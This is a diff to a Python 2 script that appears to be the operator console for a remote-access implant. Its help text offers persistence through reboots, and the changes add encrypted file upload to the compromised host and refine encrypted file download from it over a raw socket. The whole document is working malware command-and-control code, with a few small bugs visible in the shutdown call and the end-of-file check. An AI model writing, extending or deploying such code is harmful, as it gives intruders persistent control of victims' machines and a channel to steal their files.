@@ -34,7 +34,7 @@ def help_menu():
         upload             - upload [src absolute path] [dest absolute path]
         enable_persistence - make implant persistent through reboots
     Local commands:
-        session            - show current session
+        session            - show info about current session
         exit               - close down connection to remote host
     """
      
@@ -50,23 +50,38 @@ def receiveFile(downFile):
         return False 
     else:   
         try:
-            f = open(downFile, 'wb')
-             
+            f = open(downFile, 'wb')            
             while True:
-                data = sock.recv(BUFFER_SIZE)
+                data = cipher.decode(sock.recv(BUFFER_SIZE))
                  
                 if not data:
                     break
                 elif data == "EOF!EOF!": 
-                    f.write(data[:-6])
+                    f.write(data[:-8])
                     break
                 else:
                     f.write(data)
-             
             f.close()
             return True
         except IOError: 
             return False
+
+def uploadFile(upFile):
+    try:
+        f = open(upFile, 'rb')
+        while True:
+            data = f.read(BUFFER_SIZE)
+
+            if not data:
+                break
+            else:
+                sock.sendall(cipher.encode(data))        
+        f.close()
+        sock.sendall(cipher.encode("EOF!EOF!"))
+        #have client send a 'complete' message back before we return True
+        return True
+    except IOError:
+        return False    
 
 try:
     sock.connect((TCP_IP, TCP_PORT))
@@ -82,17 +97,23 @@ try:
         elif cmd.startswith('download'):
             print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
             sock.sendall(cipher.encode(cmd + "\n"))
-            print 'sent command...'
             
             if receiveFile(cmd[9:].split(' ')[1]):
-                print "\tFile transfer complete!\n"
+                print "[+] File transfer complete!\n"
             else:
-                print "[!] File transfer failed\n"
-        elif cmd == 'upload':
-            #rf = cmd[7:].split(' ')[0]
-            pass
+                print "[!] File transfer failed.\n"
+        elif cmd.startswith('upload'): #do I need to md5 the file before and after to determine success?
+            sendMeFile = cmd[7:].split(' ')[0]
+            print "[+] Uploading " + sendMeFile + "..."
+            
+            sock.sendall(cipher.encode(cmd + "\n"))
+            
+            if uploadFile(sendMeFile):
+                print "[+] File transfer complete!\n"
+            else:
+                print "[!] File transfer failed.\n"
         elif cmd == 'exit' or cmd == 'quit':
-            sock.shutdown('SHUT_WR')
+            sock.shutdown('SHUT_WR') #does this need to be encoded?
             sock.close()
             break
         else:
